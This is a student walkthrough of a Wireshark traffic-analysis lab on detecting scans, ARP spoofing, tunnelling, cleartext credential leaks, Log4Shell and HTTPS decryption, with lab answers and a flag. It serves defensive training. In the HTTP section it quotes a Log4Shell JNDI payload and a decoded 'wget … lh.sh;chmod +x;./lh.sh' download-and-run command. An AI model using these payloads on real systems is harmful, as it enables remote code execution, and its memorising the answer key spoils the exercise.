# Wireshark: Traffic Analysis

## Overview

This room builds on Wireshark fundamentals to focus on real attack detection identifying Nmap reconnaissance scans, ARP spoofing/MITM attacks, tunnelling (ICMP & DNS), cleartext protocol abuse (FTP & HTTP), and decrypting HTTPS traffic. Each task moves from theory to hands-on PCAP investigation, mimicking the workflow of a real SOC analyst.

---

## Learning Objectives

- Identify Nmap scan types (TCP Connect, TCP SYN, UDP) in a PCAP
- Detect ARP Spoofing / Man-in-the-Middle attacks
- Identify host information using DHCP, NBNS, and Kerberos traffic
- Detect ICMP and DNS tunnelling used for C2 and data exfiltration
- Analyze FTP traffic for credential theft and brute-force attacks
- Analyze HTTP traffic for web attacks, suspicious user agents, and Log4Shell exploitation
- Decrypt HTTPS traffic using an SSL/TLS Key Log File

---

## 1. Nmap Scan Detection

### Objective
Learn how to identify different Nmap scan types in a PCAP using Wireshark.

### What is Nmap?

Nmap (Network Mapper) is a network scanning tool used to discover live hosts, identify open ports, detect running services, and perform security assessments.
Attackers often perform Nmap reconnaissance before launching an attack. Recognizing these scan patterns is an early-warning signal.

---

### Three Common Scan Types

#### 1. TCP Connect Scan -sT 

**Characteristics:**
- Completes the full TCP 3-way handshake
- Used by non-root (non-privileged) users
- Window size usually > 1024

**Open Port flow:**
```
Client → SYN
Server → SYN, ACK
Client → ACK
=> Connection established
```

**Closed Port flow:**
```
Client → SYN
Server → RST, ACK
=> Connection refused
```

**Detection Filter:**
```
tcp.flags.syn == 1 &&
tcp.flags.ack == 0 &&
tcp.window_size > 1024
```

A large number of completed TCP handshakes to many different ports = possible TCP Connect scan.

---

#### 2. TCP SYN Scan -sS

**Characteristics:**
- Half-open scan does **NOT** complete the TCP handshake
- Requires privileged/root access
- Window size usually **≤ 1024**
- Faster and stealthier than TCP Connect

**Open Port flow:**
```
Client → SYN
Server → SYN, ACK
Client → RST
=> Handshake intentionally aborted
```

**Closed Port flow:**
```
Client → SYN
Server → RST, ACK
```

**Detection Filter:**
```
tcp.flags.syn == 1 &&
tcp.flags.ack == 0 &&
tcp.window_size <= 1024
```

Many SYN packets followed by immediate RST packets often indicate SYN scanning.

---

#### 3. UDP Scan -sU

**Characteristics:**
- No handshake
- Open ports usually do **NOT** reply
- Closed ports return **ICMP Port Unreachable**

**Open Port flow:**
```
Client → UDP
(No response)
```

**Closed Port flow:**
```
Client → UDP
Server → ICMP Destination Unreachable (Type 3, Code 3)
```

**Detection Filter:**
```
icmp.type == 3 &&
icmp.code == 3
```

Many ICMP Type 3 Code 3 packets often indicate a UDP port scan.

---

### Useful TCP Flag Filters

| Purpose | Filter |
|---------|--------|
| SYN | tcp.flags.syn == 1 |
| ACK | tcp.flags.ack == 1 |
| SYN-ACK | tcp.flags.syn == 1 && tcp.flags.ack == 1 |
| RST | tcp.flags.reset == 1 |
| FIN | tcp.flags.fin == 1 |

### Window Size Trick

The TCP window size helps distinguish the two scan types:

```
TCP Connect: tcp.window_size > 1024
TCP SYN:     tcp.window_size <= 1024
```

---

### SOC Investigation Workflow:

1. Identify many SYN packets
2. Check TCP flags
3. Examine window size
4. Determine scan type
5. Count scanned ports
6. Identify target services

---

### Lab Exercises

**Q1: What is the total number of "TCP Connect" scans?**

Filter: `tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size > 1024`

Answer: 1000

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1.PNG?raw=true">
</div> 

**Q2: Which scan type is used to scan TCP port 80?**

Filter: `tcp.port == 80`

Answer: TCP Connect

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q2.PNG?raw=true">
</div> 

**Q3: How many "UDP close port" messages are there?**

Filter: `icmp.type == 3 and icmp.code == 3`

Answer: 1083

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q3.PNG?raw=true">
</div> 

**Q4: Which UDP port in the 55–70 port range is open?**

Filter: `udp.dstport >= 50 and udp.port <= 70`

Answer: 68

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q4b.PNG?raw=true">
</div> 

---

## 2. ARP Poisoning / MITM Detection

### Objective
Detect an ARP Spoofing (Man-in-the-Middle) attack using Wireshark.

### What is ARP?

ARP (Address Resolution Protocol) translates IP addresses to MAC addresses so devices can communicate at the Ethernet layer.

Example: 192.168.1.1 → 50:78:b3:f3:cd:f4

### Normal ARP Workflow

1.Host A broadcasts: "Who has 192.168.1.1?"
         
2.Gateway replies:   "192.168.1.1 is 50:78:b3:f3:cd:f4"
         
3.Host A saves:      192.168.1.1 → 50:78:b3:f3:cd:f4 in its ARP Cache


### ARP Weakness

ARP has no authentication. Anyone can broadcast a fake reply claiming to own any IP address, and the victim will believe it.

### ARP Poisoning Attack Flow

The attacker sends unsolicited fake ARP replies, corrupting the victim's ARP cache:

Normal:  Victim → Gateway

After:   Victim → Attacker → Gateway


The attacker can now **read, modify, and forward** all traffic, a classic Man-in-the-Middle (MITM) attack.

ARP Spoofing only works inside the **Local Network (LAN)**.

---

### Important Wireshark Filters

| Purpose | Filter |
|---------|--------|
| Show all ARP | arp |
| ARP Requests | arp.opcode == 1 |
| ARP Replies | arp.opcode == 2 |
| Duplicate IP detection | arp.duplicate-address-detected |
| ARP Flood (from specific MAC) | ((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == attacker_mac) |

---

### Signs of ARP Spoofing

- Same IP claimed by two different MAC addresses
- One MAC address claims multiple IP addresses
- Large number of ARP requests in a short period
- Victim traffic routing through an unexpected host

### MITM Evidence Pattern

Legitimate traffic:  Victim → Gateway

Compromised traffic: Victim → Attacker → Gateway

---

### Investigation Workflow

1. Check ARP traffic
2. Identify MAC/IP mappings
3. Look for duplicate IP addresses
4. Identify suspicious MAC addresses
5. Detect ARP flooding
6. Follow HTTP traffic through the attacker
7. Add Source/Destination MAC as columns in Wireshark
8. Verify that packets pass through the attacker's MAC

---

### Lab Exercises

**Q1: What is the number of ARP requests crafted by the attacker?**

First, identify the attacker using:

```
arp.duplicate-address-detected or arp.duplicate-address-frame
```

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(2).PNG?raw=true">
</div> 

Attacker MAC identified: "00:0c:29:e2:18:b4"

Then filter ARP requests from that MAC:

```
arp.opcode == 1 and arp.src.hw_mac == 00:0c:29:e2:18:b4
```

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q2a.PNG?raw=true">
</div> 

Answer: 284

**Q2: What is the number of HTTP packets received by the attacker?**

Filter: `http and eth.addr == 00:0c:29:e2:18:b4`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q3(1).PNG?raw=true">
</div> 

Answer: 90


**Q3: What is the password of "Client986"?**

Filter: `urlencoded-form matches "client986"`

Answer: clientnothere!

**Q4: What is the comment provided by "Client354"?**

Filter: `http.host == "testphp.vulnweb.com" and http.request.method == "POST"`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q5.PNG?raw=true">
</div> 

Answer: Nice work!

---

## 3. Identifying Hosts (DHCP, NBNS, Kerberos)

### Objective
Identify devices and users on the network using DHCP, NetBIOS, and Kerberos traffic.

### Why is this important?

During an investigation you need to answer:
- Which device generated the traffic?
- Which user logged in?
- What is the hostname?
- Which IP belongs to which host?

---

### 1. DHCP

DHCP automatically assigns IP addresses, gateway, DNS, and lease time to devices joining the network. It is the best source for **linking MAC addresses to hostnames and IPs**.

**Key Filters:**

| Purpose | Filter |
|---------|--------|
| Show all DHCP traffic | dhcp or bootp |
| DHCP Request (client asks for IP) | dhcp.option.dhcp == 3 |
| DHCP ACK (server accepts) | dhcp.option.dhcp == 5 |
| DHCP NAK (server rejects) | dhcp.option.dhcp == 6 |
| Search by hostname | dhcp.option.hostname contains "Galaxy" |
| Search by requested IP | dhcp.option.dhcp == 3 && dhcp.option.requested_ip_address == 172.16.13.85 |

**Useful DHCP Options:**

| Option | Meaning |
|--------|---------|
| 12 | Hostname |
| 15 | Domain Name |
| 50 | Requested IP |
| 51 | Lease Time |
| 61 | Client MAC |

---

### 2. NetBIOS (NBNS)

NetBIOS Name Service helps Windows devices discover each other by name on the local network.

**Example:** PC01 → 172.16.1.20`

**Key Filters:**

| Purpose | Filter |
|---------|--------|
| Show all NBNS traffic | nbns |
| Search by hostname | nbns.name contains "LIVALJM" |
| NBNS registration requests | nbns.flags.opcode == 5 |

---

### 3. Kerberos

Kerberos is the authentication protocol used in Active Directory environments. It proves the identity of both users and computers, making it a goldmine for identifying who logged into which machine.

**Key Filters:**

| Purpose | Filter |
|---------|--------|
| All Kerberos traffic | kerberos |
| Search by username | kerberos.CNameString contains "u5" |
| Only users (no computers) | kerberos.CNameString && !(kerberos.CNameString contains "$") |
| Only computers | kerberos.CNameString contains "$" |
| Kerberos version 5 | kerberos.pvno == 5 |
| Search by domain | kerberos.realm contains ".org" |

In Kerberos, "CNameString" values ending with $ are **computer hostnames**. Values without $ are **usernames**.

**Useful Kerberos Fields:**

| Field | Meaning |
|-------|---------|
| CNameString | Username or Computer name |
| realm | Domain |
| SNameString | Requested service |
| pvno | Kerberos version |
| addresses | Client IP |

---

### Investigation Workflow

1. Find DHCP traffic → map MAC ↔ Hostname ↔ IP
2. Check NBNS for Windows device names
3. Check Kerberos for logged-in usernames
4. Correlate all three to build a complete host/user picture

---

### Lab Exercises

**Q1: What is the MAC address of the host "Galaxy A30"?**

Filter: `dhcp.option.hostname contains "A30"`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture8(2).PNG?raw=true">
</div> 

Answer: 9a:81:41:cb:96:6c

**Q2: How many NetBIOS registration requests does the "LIVALJM" workstation have?**

Filter: `nbns.flags.opcode == 5 and nbns.name matches "LIVALJM"`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture11.PNG?raw=true">
</div> 

Answer: 16

**Q3: Which host requested the IP address "172.16.13.85"?**

Filter: `dhcp.option.dhcp == 3 && dhcp.option.requested_ip_address == 172.16.13.85`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture12.PNG?raw=true">
</div> 

Answer: Galaxy-A12

**Q4: What is the IP address of user "u5"? (defanged format)**

Filter: `kerberos.CNameString contains "u5"`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture13(2).PNG?raw=true">
</div> 

Then defang the IP using CyberChef 

Answer: 10[.]1[.]12[.]2

**Q5: What is the hostname of the available host in the Kerberos packets?**

Filter: `kerberos.CNameString contains "$"`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Capture15.PNG?raw=true">
</div> 

Answer: xp1$

---

## 4. Tunnelling Traffic (ICMP & DNS)

### Objective

Detect ICMP and DNS tunnelling used for data exfiltration and Command & Control (C2).

### What is Tunnelling?

Tunnelling = hiding one protocol or data **inside** another trusted protocol.

Example 1: SSH commands hidden inside ICMP packets

Example 2: Stolen data encoded in DNS query names

### Why do attackers use tunnelling?

- ICMP and DNS are trusted and rarely blocked by firewalls
- They blend naturally with legitimate network traffic
- They can bypass most perimeter controls undetected

---

### ICMP Tunnelling

**Normal ICMP** is used for ping, error reporting, and network diagnostics.

**Malicious ICMP** hides data inside the ICMP payload. Possible hidden content: SSH, HTTP, TCP, C2 commands, stolen files.

**Indicators:**
- Too many ICMP packets
- Unusually large ICMP packets
- ICMP payload contains recognizable protocol strings

**Key Filters:**

| Purpose | Filter |
|---------|--------|
| Show all ICMP | icmp |
| Large ICMP packets | icmp && data.len > 64 |
| ICMP containing SSH strings | (data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http") |

---

### DNS Tunnelling

**Normal DNS:**

Client asks: google.com

DNS replies:  142.x.x.x

**Malicious DNS**  malware encodes stolen data inside the subdomain:

Malicious query: YWJjMTIz.dataexfil.com
                 ^^^^^^^^
                 This random string IS the stolen data


**Indicators:**
- Unusually long DNS query names
- Random-looking subdomains
- High volume of DNS requests
- All queries going to the same destination domain

**Key Filters:**

| Purpose | Filter |
|---------|--------|
| Show all DNS | dns |
| Long DNS query names | dns.qry.name.len > 15 && !mdns |
| Search for dnscat tool | dns contains "dnscat" |
| Very long .com queries | dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com" |

---


ICMP and DNS themselves are **not** malicious. The anomaly is in the **size, frequency, payload, and query names**.

---

### Investigation Workflow

1. Check ICMP traffic
2. Look for unusual packet sizes
3. Inspect the ICMP payload for embedded protocol strings
4. Identify the hidden protocol
5. Check DNS traffic
6. Look for long or random subdomains
7. Count repeated DNS requests to the same domain
8. Identify the suspicious destination domain

---

### Lab Exercises

**Q1: Which protocol is used in ICMP tunnelling? (icmp-tunnel.pcap)**

Filter:
```
(data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")
```

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(3).PNG?raw=true">
</div> 


Answer: SSH

The strings visible in the ICMP payload Diffie-Hellman, cipher suite names, authentication method identifiers are all characteristic of **SSH protocol negotiation**.

**Q2: What is the suspicious domain receiving anomalous DNS queries? (dns.pcap — defanged)**

Filter: `dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com"`


<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q2(1).PNG?raw=true">
</div> 

Answer: dataexfil[.]com

---

## 5. Cleartext Protocol Analysis: FTP

### Objective

Analyze FTP traffic to detect credential theft, unauthorized access, file exfiltration, and brute-force attacks.

Because FTP is **not encrypted**, usernames, passwords, commands, and filenames are all visible directly in Wireshark.

### What is FTP?

FTP (File Transfer Protocol) transfers files between a client and a server.

| Port | Purpose |
|------|---------|
| **21** | Control connection (commands) |
| **20** | Data connection (file transfer, active mode) |

Everything is transmitted in **plain text**:

```
USER admin
PASS password123
```
Anyone capturing traffic can read these credentials immediately.

### Why is FTP Dangerous?

FTP does **NOT** encrypt: Username, Password, Commands, File names, Directory listings.

Common security risks: Credential theft, MITM, Malware upload, Data exfiltration, Unauthorized file access, Brute-force attacks.

---

### FTP Response Codes

**1xx Informational:**

| Code | Meaning |
|------|---------|
| 211 | System status |
| 212 | Directory status |
| 213 | File status |

**2xx Successful Connection:**

| Code | Meaning |
|------|---------|
| 220 | Service ready |
| 227 | Entering Passive Mode |
| 228 | Long Passive Mode |
| 229 | Extended Passive Mode |

**3xx Authentication:**

| Code | Meaning |
|------|---------|
| 230 | Login successful |
| 231 | Logout |
| 331 | Username accepted (waiting for password) |
| 430 | Invalid username/password |
| 530 | Login failed |

---

### Important FTP Commands

| Command | Purpose | Filter |
|---------|---------|--------|
| USER | Displays username | ftp.request.command == "USER" |
| PASS | Displays password | ftp.request.command == "PASS" |
| LIST | List directory contents | ftp.request.command == "LIST" |
| CWD | Change directory | ftp.request.command == "CWD" |
| STOR | Upload file | ftp.request.command == "STOR" |
| RETR | Download file | ftp.request.command == "RETR" |
| DELE | Delete file | ftp.request.command == "DELE" |
| CHMOD | Change permissions | ftp contains "CHMOD" |

**Search for a specific password:**
```
ftp.request.arg == "password123"
```

---

### Attack Detection Filters

| Attack Type | Filter |
|-------------|--------|
| Brute force (failed logins) | ftp.response.code == 530 |
| Successful login | ftp.response.code == 230 |
| Username targeting (repeated fails on one account) | (ftp.response.code == 530) && (ftp.response.arg contains "admin") |
| Password spray (same password across many accounts) | (ftp.request.command == "PASS") && (ftp.request.arg == "Summer2025") |

---

### Key Wireshark Filters FTP Summary

| Purpose | Filter |
|---------|--------|
| All FTP traffic | ftp |
| Successful login | ftp.response.code == 230 |
| Failed login | ftp.response.code == 530 |
| Username | ftp.request.command == "USER" |
| Password | ftp.request.command == "PASS" |
| Specific password | ftp.request.arg == "password" |
| Passive mode | ftp.response.code == 227 |
| File status | ftp.response.code == 213 |
| CHMOD activity | ftp contains "CHMOD" |

---

### Investigation Workflow

**Step 1:** Show FTP traffic → ftp
**Step 2:** Look for failed logins → ftp.response.code == 530
**Step 3:** Look for successful login → ftp.response.code == 230
**Step 4:** Find username → ftp.request.command == "USER"
**Step 5:** Find password → ftp.request.command == "PASS"
**Step 6:** Inspect commands (LIST, CWD, STOR, RETR, DELE, CHMOD)
**Step 7:** Determine what was uploaded, downloaded, deleted, or permission-changed

---

### Lab Exercises

**Q1: How many incorrect login attempts are there?**

Filter: `ftp.response.code == 530`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(3).PNG?raw=true">
</div> 


Answer: 737

**Q2: What is the size of the file accessed by the "ftp" account?**

Filter: `ftp.response.code == 213`

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Traffic_Analysis/Q1(3).PNG?raw=true">
</div> 

Answer: `39424`

**Q: What is the filename the adversary downloaded?**
Filter: `ftp.request.command == "RETR"`
Answer: `resume.doc`

**Q: What is the command used by the adversary to change file permissions?**
Filter: `ftp contains "CHMOD"`
Answer: `SITE CHMOD 777 resume.doc`

---

## 6. HTTP Analysis

### 🎯 Objective
Analyze HTTP traffic to detect phishing, web attacks, data exfiltration, C2 communication, suspicious user agents, and exploitation attempts (e.g., Log4Shell).

> ⚠️ **Key idea:** HTTP is **plaintext** — URLs, headers, cookies, forms, and request details are all fully visible in Wireshark.

### HTTP vs HTTPS

| Property | HTTP | HTTPS |
|----------|------|-------|
| Port | 80 | 443 |
| Encryption | None (plaintext) | TLS encrypted |
| Readable in Wireshark | Yes | Only after decryption |
| Easy to analyze | Yes | Requires key log file |

---

### HTTP Request Methods

| Method | Purpose | Filter |
|--------|---------|--------|
| GET | Request data from server | `http.request.method == "GET"` |
| POST | Send data to server (forms, file uploads, APIs) | `http.request.method == "POST"` |
| All requests | Show all HTTP requests | `http.request` |

---

### HTTP Response Codes

**Success:**

| Code | Meaning | Filter |
|------|---------|--------|
| 200 | OK | `http.response.code == 200` |

**Redirection:**

| Code | Meaning |
|------|---------|
| 301 | Moved Permanently |
| 302 | Moved Temporarily |

**Client Errors:**

| Code | Meaning | Filter |
|------|---------|--------|
| 400 | Bad Request | `http.response.code == 400` |
| 401 | Unauthorized | `http.response.code == 401` |
| 403 | Forbidden | `http.response.code == 403` |
| 404 | Not Found | `http.response.code == 404` |
| 405 | Method Not Allowed | — |
| 408 | Request Timeout | — |

**Server Errors:**

| Code | Meaning | Filter |
|------|---------|--------|
| 500 | Internal Server Error | — |
| 503 | Service Unavailable | `http.response.code == 503` |

---

### Useful HTTP Fields & Filters

| Field | Purpose | Filter |
|-------|---------|--------|
| User-Agent | Identifies browser/tool making the request | `http.user_agent` |
| Host | Requested domain | `http.host == "example.com"` |
| Request URI | Requested path | `http.request.uri contains "admin"` |
| Full URI | Complete URL | `http.request.full_uri contains "admin"` |
| Server header | Web server software | `http.server contains "Apache"` |
| Connection | Keep-Alive status | `http.connection == "Keep-Alive"` |
| Plaintext search | Search inside HTTP response content | `data-text-lines contains "password"` |

---

### User-Agent Analysis

The User-Agent field identifies what made the HTTP request. Legitimate examples:

```
Mozilla/5.0
Chrome
Firefox
Edge
Safari
```

Attackers often forget to hide their tools. Suspicious examples:

```
Nmap
Nikto
sqlmap
Wfuzz
```

**Detection filter for scanning tools:**
```
(http.user_agent contains "sqlmap") ||
(http.user_agent contains "Nmap") ||
(http.user_agent contains "Nikto") ||
(http.user_agent contains "Wfuzz")
```

**Signs of a suspicious User-Agent:**
- Different User-Agent values from the same host in a short period
- Typographical mistakes (`Mozlila`, `Mozlilla`)
- Scanner tool names (`sqlmap`, `Nikto`, `Nmap`)
- Random or encoded payloads

> ⚠️ **Important Rule:** Never trust a User-Agent alone. It is **completely controlled by the client** and trivially spoofed. Treat it as **one indicator**, not proof.

---

### Log4Shell (Log4j) Detection

The **Log4Shell** vulnerability (CVE-2021-44228) exploited applications using Log4j by injecting malicious JNDI strings into HTTP headers such as `User-Agent` or `X-Forwarded-For`.

**Common indicators:**
- POST requests with `jndi:ldap` in headers
- `Exploit.class` in the payload
- Payloads like: `${jndi:ldap://attacker.com/...}`

**Detection Filters:**

| Purpose | Filter |
|---------|--------|
| Filter POST requests | `http.request.method == "POST"` |
| Search for JNDI payload | `frame contains "jndi"` or `ip contains "jndi"` |
| Search for Exploit class | `frame contains "Exploit"` |
| Suspicious User-Agent | `(http.user_agent contains "$") \|\| (http.user_agent contains "==")` |

---

### Key Wireshark Filters — HTTP Summary

| Purpose | Filter |
|---------|--------|
| All HTTP traffic | `http` |
| HTTP/2 traffic | `http2` |
| GET requests | `http.request.method == "GET"` |
| POST requests | `http.request.method == "POST"` |
| All requests | `http.request` |
| 200 OK | `http.response.code == 200` |
| 401 Unauthorized | `http.response.code == 401` |
| 403 Forbidden | `http.response.code == 403` |
| 404 Not Found | `http.response.code == 404` |
| Specific host | `http.host == "example.com"` |
| URI contains path | `http.request.uri contains "admin"` |
| Apache server | `http.server contains "Apache"` |
| Search plaintext | `data-text-lines contains "password"` |
| User-Agent: Nmap | `http.user_agent contains "Nmap"` |
| Log4Shell payload | `frame contains "jndi"` |

---

### Investigation Workflow

**Step 1:** Show HTTP traffic → `http`
**Step 2:** Identify request types → `http.request`
**Step 3:** Review response codes → `http.response.code == 404`
**Step 4:** Inspect Host → `http.host`
**Step 5:** Inspect URI → `http.request.uri`
**Step 6:** Inspect User-Agent → `http.user_agent`
**Step 7:** Search for attack patterns → `frame contains "jndi"`
**Step 8:** Follow the TCP Stream to read the full HTTP conversation

---

### 🧪 Lab Exercises

**Q: What is the number of anomalous "user-agent" types?**
Filter: `http.user_agent`

The 6 user agents found (anomalous ones highlighted):
1. `Mozilla/5.0 (Windows; U; Windows NT 6.4...)` — legitimate browser
2. `Mozilla/5.0 (compatible; Nmap Scripting Engine...)` — 🚩 Nmap
3. `Wfuzz/2.4` — 🚩 fuzzing tool
4. `sqlmap/1.4#stable` — 🚩 SQL injection tool
5. `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/...}` — 🚩 Log4Shell payload
6. `Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0)` — legitimate browser

Answer: `6`

**Q: What is the packet number with a subtle spelling difference in the user agent field?**
Filter: `http.user_agent` → look for `Mozlila` (misspelling of `Mozilla`)
Answer: `52`

**Q: What is the packet number of the Log4j attack starting phase?**
Filter: `(ip contains "jndi") or (ip contains "Exploit")`
Answer: `444`

**Q: What is the IP address contacted by the adversary via Log4Shell? (defanged)**
From packet 444, extract and decode the Base64 payload in the User-Agent using CyberChef → From Base64.
The decoded command contains: `wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh`
Answer: `62[.]210[.]130[.]250`

---

## 7. Decrypting HTTPS Traffic

### 🎯 Objective
Learn how to identify HTTPS traffic, understand the TLS handshake, decrypt HTTPS using an SSL/TLS Key Log File, and analyze decrypted HTTP/2 traffic.

> ⚠️ **Key idea:** HTTPS traffic is encrypted. Wireshark **cannot decrypt it** unless it has the correct TLS session keys.

### What is HTTPS?

HTTPS = HTTP + **TLS (Transport Layer Security)**

Unlike HTTP, HTTPS encrypts: URLs (after handshake), Headers, Cookies, Forms, Passwords, Files, HTTP payload.

### HTTP vs HTTPS

| Property | HTTP | HTTPS |
|----------|------|-------|
| Port | 80 | 443 |
| Content | Plaintext | Encrypted (TLS) |
| Readable in Wireshark | Yes | Only after decryption |
| Analysis | Direct | Requires TLS key log |

---

### TLS Handshake

Before encryption begins, the client and server negotiate session parameters:

**Step 1 — Client Hello** (`tls.handshake.type == 1`)
Contains: TLS version, supported cipher suites, random value, extensions, **SNI (Server Name Indication = requested hostname)**

**Step 2 — Server Hello** (`tls.handshake.type == 2`)
Contains: Selected cipher suite, certificate, server random

After the handshake, all data is encrypted.

**Useful TLS Filters:**

| Purpose | Filter |
|---------|--------|
| All TLS/HTTPS traffic | `tls` |
| Client Hello | `tls.handshake.type == 1` |
| Server Hello | `tls.handshake.type == 2` |
| Client Hello (no SSDP noise) | `(http.request or tls.handshake.type == 1) and !(ssdp)` |
| Server Hello (no SSDP noise) | `(http.request or tls.handshake.type == 2) and !(ssdp)` |
| Exclude SSDP | `!(ssdp)` |
| Find SNI (requested hostname) | `tls.handshake.extensions_server_name` |

---

### What is SSLKEYLOGFILE?

A **Key Log File** stores TLS session secrets generated during a browser session. Wireshark can load this file to decrypt matching TLS traffic.

```
Format:
CLIENT_RANDOM <random> <session key>
```

> ⚠️ **Important Rule:** The key log file **must be generated while traffic is being captured**. You **cannot recreate** session keys afterward.

**Supported browsers:** Chrome, Firefox
**Environment variable to set:** `SSLKEYLOGFILE`

---

### Loading the Key Log File in Wireshark

```
Edit → Preferences → Protocols → TLS → (Pre)-Master Secret Log Filename
Select: KeysLogFile.txt
```

Wireshark immediately decrypts all matching TLS sessions.

---

### Before vs After Decryption

| State | Visible | Hidden |
|-------|---------|--------|
| **Before** | TCP, TLS, Client Hello, Server Hello | HTTP, URLs, Cookies, Headers, Data |
| **After** | HTTP/2, Headers, URLs, Cookies, Requests, Responses, Payload | Nothing — everything is now readable |

**New packet sections visible after decryption:**
```
Frame → Decrypted TLS → Decompressed Header → Reassembled TCP → Reassembled SSL → HTTP/2
```

---

### HTTP/2

Modern HTTPS websites use HTTP/2 rather than HTTP/1.1. Benefits: faster, multiplexed, binary protocol, header compression.

Filter: `http2`

**After decryption, inspect these HTTP/2 fields:**
- `:authority` — the destination domain
- `:path` — the requested path
- `:method` — GET, POST, etc.
- Cookies
- User-Agent
- HTTP/2 stream data

---

### Key Wireshark Filters — HTTPS/TLS Summary

| Purpose | Filter |
|---------|--------|
| TLS traffic | `tls` |
| Client Hello | `tls.handshake.type == 1` |
| Server Hello | `tls.handshake.type == 2` |
| HTTP requests (post-decryption) | `http.request` |
| HTTP/2 packets | `http2` |
| Exclude SSDP | `!(ssdp)` |
| Client Hello (clean) | `(http.request or tls.handshake.type == 1) and !(ssdp)` |
| Server Hello (clean) | `(http.request or tls.handshake.type == 2) and !(ssdp)` |

---

### Practical Investigation Tips

- Start with **Client Hello** to identify which domains users contacted (via the SNI extension)
- Load the **SSLKEYLOGFILE** as early as possible in the analysis
- After decryption, inspect `:authority`, `:path`, `:method`, Cookies, User-Agent, and HTTP/2 streams
- If traffic remains encrypted after loading the key log, verify: the key log matches the same capture session, it was generated during the session, and the browser supports `SSLKEYLOGFILE`

---

### Investigation Workflow

**Step 1:** Show TLS traffic → `tls`
**Step 2:** Find Client Hello → `tls.handshake.type == 1`
**Step 3:** Find Server Hello → `tls.handshake.type == 2`
**Step 4:** Load Key Log File → `Edit → Preferences → Protocols → TLS → KeysLogFile.txt`
**Step 5:** Traffic becomes decrypted
**Step 6:** Filter HTTP/2 → `http2`
**Step 7:** Inspect headers, authority, URI, cookies, payload

---

### 🧪 Lab Exercises

**Q: What is the frame number of the "Client Hello" message sent to "accounts.google.com"?**
Filter: `(http.request or tls.handshake.type == 1) and !(ssdp)`
Then check the SNI field in each Client Hello for `accounts.google.com`
Answer: `16`

**Q: After loading KeysLogFile.txt, what is the number of HTTP/2 packets?**
Navigation: `Edit → Preferences → Protocols → TLS → browse to KeysLogFile.txt`
Filter: `http2`
Answer: `115`

**Q: Go to Frame 322. What is the authority header of the HTTP/2 packet? (defanged)**
Filter: `http2` → navigate to frame 322 → expand HTTP/2 headers → find `:authority`
Then defang using CyberChef → **Defang URL**
Answer: `safebrowsing[.]googleapis[.]com`

**Q: Investigate the decrypted packets and find the flag. What is the flag?**
Filter: `http` → look through HTTP responses for text/plain content containing a flag
Answer: `FLAG{THM-PACKETMASTER}`

---

## 8. Bonus Tasks

### Task 9 — Hunt Cleartext Credentials (Bonus-exercise.pcap)

**Q: What is the packet number of the credentials using "HTTP Basic Auth"?**

HTTP Basic Auth credentials appear in the `Authorization` header in plaintext (base64 encoded but not encrypted).
Look for `Authorization: Basic` in HTTP packets.
Answer: `237`

**Q: What is the packet number where an "empty password" was submitted?**
Filter: `ftp.request.command == "PASS"`
Look for a PASS command with no argument value.
Answer: `170`

---

### Task 10 — Actionable Results (Bonus-exercise.pcap)

Wireshark can automatically generate firewall rules from captured packets via `Tools → Firewall ACL Rules`.

**Q: Select packet 99. Create an IPFirewall (ipfw) rule. What is the rule for "denying source IPv4 address"?**
Navigation: Select packet 99 → `Tools → Firewall ACL Rules → IPFirewall (ipfw) → Inbound + Deny`
Answer: `add deny ip from 10.121.70.151 to any in`

**Q: Select packet 231. Create an IPFirewall rule. What is the rule for "allowing destination MAC address"?**
Navigation: Select packet 231 → `Tools → Firewall ACL Rules → IPFirewall (ipfw) → Inbound + Allow`
Answer: `add allow MAC 00:d0:59:aa:af:80 any in`

---

## 📚 Key Takeaways

**Nmap Detection**
- Window size is the key differentiator: `> 1024` = TCP Connect, `≤ 1024` = TCP SYN
- ICMP Type 3 Code 3 floods = UDP scan
- Reconnaissance always precedes an attack — detect it early

**ARP / MITM**
- `arp.duplicate-address-detected` is your fastest path to finding an attacker's MAC
- Once you have the attacker's MAC, pivot to `eth.addr == attacker_mac` for everything they touched

**Host Identification**
- DHCP = MAC → Hostname → IP (best source for device identity)
- NBNS = Windows device names
- Kerberos = usernames (`CNameString` without `$`) and computers (`CNameString` with `$`)
- Correlate all three to fully map an environment

**Tunnelling**
- ICMP and DNS are trusted — attackers hide C2 traffic inside them
- Anomalies live in packet size, frequency, and payload content, not the protocol itself
